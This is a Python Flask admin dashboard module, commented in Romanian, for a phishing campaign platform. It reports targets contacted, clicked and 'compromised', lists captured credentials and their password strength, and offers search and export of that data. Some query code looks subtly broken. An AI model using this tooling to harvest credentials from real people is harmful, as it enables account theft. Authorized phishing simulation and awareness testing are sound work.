import logging
from datetime import datetime, timedelta
from flask import Blueprint, render_template, jsonify, request
from sqlalchemy import func, desc, text

from models.campaign import Campaign
from models.target import Target
from models.tracking import Tracking
from models.credential import Credential
from models.template import Template
from services.campaign_service import CampaignService
from services.tracking_service import TrackingService
from services.credential_capture import CredentialCaptureService
from utils.database import db
from utils.helpers import get_client_ip


# Crearea Blueprint-ului pentru dashboard
bp = Blueprint('dashboard', __name__, url_prefix='/admin')

# Inițializează serviciile
tracking_service = TrackingService()
credential_service = CredentialCaptureService()
logger = logging.getLogger(__name__)


@bp.route('/')
@bp.route('/dashboard')
def index():
    """
    Dashboard principal cu overview complet
    
    Afișează:
    - Statistici generale
    - Campanii active
    - Activitate recentă
    - Quick stats
    """
    try:
        # Statistici generale
        dashboard_stats = CampaignService.get_dashboard_stats()
        
        # Campanii active și recente
        active_campaigns = Campaign.get_active_campaigns()
        recent_campaigns = Campaign.get_recent_campaigns(5)
        
        # Activitate recentă (ultimele 24h)
        yesterday = datetime.utcnow() - timedelta(days=1)
        recent_activity = Tracking.query.filter(
            Tracking.timestamp >= yesterday
        ).order_by(desc(Tracking.timestamp)).limit(20).all()
        
        # Top 3 campanii după success rate
        top_campaigns = db.session.query(Campaign)\
            .join(Credential, Campaign.id == Credential.campaign_id, isouter=True)\
            .join(Target, Campaign.id == Target.campaign_id, isouter=True)\
            .group_by(Campaign.id)\
            .having(func.count(Target.id) > 0)\
            .order_by(
                desc(func.count(Credential.id).cast(db.Float) / func.count(Target.id) * 100)
            ).limit(3).all()
        
        # Credențiale capturate recent
        recent_credentials = Credential.query\
            .filter(Credential.captured_at >= yesterday)\
            .order_by(desc(Credential.captured_at)).limit(10).all()
        
        # Distribuția puterii parolelor (global)
        password_strength_stats = Credential.get_strength_distribution()
        
        # Activitate pe ore (ultimele 7 zile)
        week_ago = datetime.utcnow() - timedelta(days=7)
        hourly_stats = db.session.query(
            func.extract('hour', Tracking.timestamp).label('hour'),
            func.count(Tracking.id).label('count')
        ).filter(
            Tracking.timestamp >= week_ago
        ).group_by('hour').all()
        
        # Convertește în format pentru grafice
        hourly_data = {hour: 0 for hour in range(24)}
        for stat in hourly_stats:
            hourly_data[int(stat.hour)] = stat.count
        
        # Device statistics
        mobile_events = Tracking.query.filter(
            Tracking.device_info.like('%"is_mobile": true%'),
            Tracking.timestamp >= week_ago
        ).count()
        
        desktop_events = Tracking.query.filter(
            Tracking.device_info.like('%"is_mobile": false%'),
            Tracking.timestamp >= week_ago
        ).count()
        
        device_stats = {
            'mobile': mobile_events,
            'desktop': desktop_events,
            'total': mobile_events + desktop_events
        }
        
        # FIXED: Return HTML template instead of JSON
        return render_template('admin/dashboard.html',
                             dashboard_stats=dashboard_stats,
                             active_campaigns=active_campaigns,
                             recent_campaigns=recent_campaigns,
                             recent_activity=recent_activity,
                             top_campaigns=top_campaigns,
                             recent_credentials=recent_credentials,
                             password_strength_stats=password_strength_stats,
                             hourly_data=hourly_data,
                             device_stats=device_stats)
        
    except Exception as e:
        logger.error(f"Error loading dashboard: {str(e)}")
        # Fallback la date minimale dacă e eroare
        return render_template('admin/dashboard.html',
                             dashboard_stats={'totals': {}},
                             active_campaigns=[],
                             recent_campaigns=[],
                             recent_activity=[],
                             top_campaigns=[],
                             recent_credentials=[],
                             password_strength_stats={},
                             hourly_data={},
                             device_stats={},
                             error_message="Error loading dashboard data")


# API ENDPOINTS (păstrăm pentru AJAX calls)
@bp.route('/api/stats')
def api_quick_stats():
    """
    Quick stats pentru sidebar sau widgets - AJAX endpoint
    
    Returns:
        JSON: Statistici rapide
    """
    try:
        stats = {
            'campaigns': {
                'total': Campaign.query.count(),
                'active': Campaign.query.filter_by(status='active').count(),
                'completed': Campaign.query.filter_by(status='completed').count()
            },
            'targets': {
                'total': Target.query.count(),
                'contacted': Target.query.filter(
                    db.or_(Target.email_sent == True, Target.sms_sent == True)
                ).count(),
                'clicked': Target.query.filter_by(clicked_link=True).count(),
                'compromised': Target.query.filter_by(entered_credentials=True).count()
            },
            'credentials': {
                'total': Credential.query.count(),
                'weak_passwords': Credential.query.filter(
                    Credential.password_strength.in_(['very_weak', 'weak'])
                ).count(),
                'flagged': Credential.query.filter_by(flagged_for_review=True).count()
            },
            'activity_today': {
                'events': Tracking.query.filter(
                    Tracking.timestamp >= datetime.utcnow().replace(hour=0, minute=0, second=0)
                ).count(),
                'emails_sent': Tracking.query.filter(
                    Tracking.event_type == 'email_sent',
                    Tracking.timestamp >= datetime.utcnow().replace(hour=0, minute=0, second=0)
                ).count(),
                'clicks': Tracking.query.filter(
                    Tracking.event_type == 'link_clicked',
                    Tracking.timestamp >= datetime.utcnow().replace(hour=0, minute=0, second=0)
                ).count()
            }
        }
        
        return jsonify(stats)
        
    except Exception as e:
        logger.error(f"Error getting quick stats: {str(e)}")
        return jsonify({'error': 'Failed to load statistics'}), 500


@bp.route('/analytics')
def analytics():
    """
    Pagina de analytics avansate
    
    Include:
    - Conversion funnels
    - Trends în timp
    - Analize comparative
    """
    try:
        # Ultimele 30 zile de activitate
        thirty_days_ago = datetime.utcnow() - timedelta(days=30)
        
        # Daily activity trend
        daily_activity = db.session.query(
            func.date(Tracking.timestamp).label('date'),
            func.count(Tracking.id).label('total_events'),
            func.count(func.distinct(
                func.case([(Tracking.event_type == 'email_sent', Tracking.target_id)])
            )).label('emails_sent'),
            func.count(func.distinct(
                func.case([(Tracking.event_type == 'link_clicked', Tracking.target_id)])
            )).label('clicks'),
            func.count(func.distinct(
                func.case([(Tracking.event_type == 'credentials_entered', Tracking.target_id)])
            )).label('credentials')
        ).filter(
            Tracking.timestamp >= thirty_days_ago
        ).group_by(func.date(Tracking.timestamp)).all()
        
        # Conversion rates per campaign
        campaign_performance = []
        for campaign in Campaign.query.filter(Campaign.created_at >= thirty_days_ago).all():
            funnel = tracking_service.get_conversion_funnel(campaign.id)
            campaign_performance.append({
                'name': campaign.name,
                'type': campaign.type,
                'status': campaign.status,
                'targets': campaign.total_targets,
                'clicks': funnel.get('link_clicked', 0),
                'credentials': funnel.get('credentials_entered', 0),
                'success_rate': campaign.success_rate,
                'click_rate': campaign.click_rate
            })
        
        # Top templates performance
        template_stats = db.session.query(
            Template.name,
            Template.type,
            func.count(Tracking.id).label('usage_count'),
            func.avg(
                func.case([(Template.type == 'email', 
                           Credential.query.filter_by(campaign_id=Tracking.campaign_id).count())])
            ).label('avg_success')
        ).join(
            Tracking, 
            func.json_extract(Tracking.event_data, '$.template_id') == Template.id,
            isouter=True
        ).group_by(Template.id).order_by(desc('usage_count')).limit(10).all()
        
        # Password analysis
        password_analysis = credential_service.get_campaign_credential_analysis(None)
        
        # FIXED: Return HTML template instead of JSON
        return render_template('admin/analytics.html',
                             daily_activity=daily_activity,
                             campaign_performance=campaign_performance,
                             template_stats=template_stats,
                             password_analysis=password_analysis)
        
    except Exception as e:
        logger.error(f"Error loading analytics: {str(e)}")
        return render_template('admin/analytics.html',
                             daily_activity=[],
                             campaign_performance=[],
                             template_stats=[],
                             password_analysis={},
                             error_message="Error loading analytics data")


@bp.route('/api/realtime')
def api_realtime():
    """
    Live feed cu activitatea în timp real - AJAX endpoint
    
    Returns:
        JSON: Evenimente recente
    """
    try:
        # Ultimele 50 evenimente
        recent_events = Tracking.query.order_by(desc(Tracking.timestamp)).limit(50).all()
        
        events_data = []
        for event in recent_events:
            events_data.append({
                'timestamp': event.timestamp.isoformat(),
                'event_type': event.event_type,
                'campaign_name': event.campaign.name if event.campaign else 'Unknown',
                'target_email': event.target.email if event.target else 'Unknown',
                'ip_address': event.ip_address,
                'browser': event.browser_data.get('browser', 'Unknown') if event.browser_data else 'Unknown',
                'device_type': 'Mobile' if (event.device_data and event.device_data.get('is_mobile')) else 'Desktop'
            })
        
        return jsonify({
            'events': events_data,
            'timestamp': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error getting realtime data: {str(e)}")
        return jsonify({'error': 'Failed to load realtime data'}), 500


@bp.route('/health')
def health_check():
    """
    Health check pentru monitoring
    
    Verifică:
    - Database connectivity
    - Services status
    - Basic stats
    
    Returnează HTML pentru browser requests, JSON pentru AJAX requests
    """
    try:
        # Test database
        db.session.execute(text('SELECT 1'))
        
        # Basic counts
        total_campaigns = Campaign.query.count()
        total_targets = Target.query.count()
        
        # Check recent activity
        last_hour = datetime.utcnow() - timedelta(hours=1)
        recent_events = Tracking.query.filter(Tracking.timestamp >= last_hour).count()
        
        health_data = {
            'status': 'healthy',
            'timestamp': datetime.utcnow().isoformat(),
            'database': 'connected',
            'statistics': {
                'campaigns': total_campaigns,
                'targets': total_targets,
                'recent_activity': recent_events
            },
            'services': {
                'tracking': 'operational',
                'email': 'operational',
                'sms': 'operational',
                'credential_capture': 'operational'
            },
            'client_info': {
                'ip': get_client_ip(),
                'user_agent': request.headers.get('User-Agent', 'Unknown')
            }
        }
        
        # Check if this is an AJAX request
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or \
           'application/json' in request.headers.get('Accept', ''):
            return jsonify(health_data)
        
        # Return HTML template for browser requests
        return render_template('admin/health.html', health_data=health_data)
        
    except Exception as e:
        logger.error(f"Health check failed: {str(e)}")
        error_data = {
            'status': 'unhealthy',
            'timestamp': datetime.utcnow().isoformat(),
            'error': str(e),
            'database': 'disconnected',
            'statistics': {
                'campaigns': 0,
                'targets': 0,
                'recent_activity': 0
            },
            'services': {
                'tracking': 'error',
                'email': 'error',
                'sms': 'error',
                'credential_capture': 'error'
            },
            'client_info': {
                'ip': get_client_ip(),
                'user_agent': request.headers.get('User-Agent', 'Unknown')
            }
        }
        
        # Check if this is an AJAX request
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or \
           'application/json' in request.headers.get('Accept', ''):
            return jsonify(error_data), 500
        
        # Return HTML template with error for browser requests
        return render_template('admin/health.html', health_data=error_data), 500


@bp.route('/api/export')
def api_export_all_data():
    """
    Export complet al tuturor datelor pentru backup - AJAX endpoint
    
    Returns:
        JSON: Toate datele din sistem
    """
    try:
        export_data = {
            'export_info': {
                'timestamp': datetime.utcnow().isoformat(),
                'exported_by': get_client_ip(),
                'version': '1.0.0'
            },
            'campaigns': [campaign.to_dict() for campaign in Campaign.query.all()],
            'targets': [target.to_dict() for target in Target.query.all()],
            'templates': [template.to_dict() for template in Template.query.all()],
            'tracking_events': [event.to_dict() for event in Tracking.query.limit(1000).all()],
            'credentials': [
                cred.to_dict(include_password=False) 
                for cred in Credential.query.all()
            ],
            'statistics': CampaignService.get_dashboard_stats()
        }
        
        return jsonify(export_data)
        
    except Exception as e:
        logger.error(f"Error exporting data: {str(e)}")
        return jsonify({'error': 'Export failed'}), 500


@bp.route('/api/search')
def api_search():
    """
    Search global prin toate datele - AJAX endpoint
    
    Query params:
    - q: query string
    - type: campaigns, targets, credentials
    """
    try:
        query = request.args.get('q', '').strip()
        search_type = request.args.get('type', 'all')
        
        if not query:
            return jsonify({'results': [], 'message': 'No search query provided'})
        
        results = {
            'query': query,
            'type': search_type,
            'results': {}
        }
        
        if search_type in ['all', 'campaigns']:
            campaigns = Campaign.search_campaigns(query)
            results['results']['campaigns'] = [c.to_dict() for c in campaigns[:10]]
        
        if search_type in ['all', 'targets']:
            targets = Target.query.filter(
                db.or_(
                    Target.email.contains(query),
                    Target.first_name.contains(query),
                    Target.last_name.contains(query),
                    Target.company.contains(query)
                )
            ).limit(10).all()
            results['results']['targets'] = [t.to_dict() for t in targets]
        
        if search_type in ['all', 'credentials']:
            credentials = Credential.query.filter(
                Credential.username.contains(query)
            ).limit(10).all()
            results['results']['credentials'] = [c.to_dict() for c in credentials]
        
        return jsonify(results)
        
    except Exception as e:
        logger.error(f"Error in search: {str(e)}")
        return jsonify({'error': 'Search failed'}), 500


# === ERROR HANDLERS ===

@bp.errorhandler(404)
def dashboard_not_found(error):
    """Handler pentru 404 în dashboard"""
    return render_template('admin/dashboard.html',
                         error_message="Page not found"), 404


@bp.errorhandler(500)
def dashboard_error(error):
    """Handler pentru 500 în dashboard"""
    logger.error(f"Dashboard error: {error}")
    return render_template('admin/dashboard.html',
                         error_message="Internal server error"), 500


# === CONTEXT PROCESSORS ===


@bp.context_processor
def inject_navigation():
    """Injectează informații pentru navigație"""
    return {
        'nav_items': [
            {'name': 'Dashboard', 'url': '/admin/', 'icon': 'dashboard'},
            {'name': 'Campaigns', 'url': '/admin/campaigns/', 'icon': 'campaigns'},
            {'name': 'Analytics', 'url': '/admin/analytics', 'icon': 'analytics'},
            {'name': 'Health', 'url': '/admin/health', 'icon': 'health'}
        ]
    }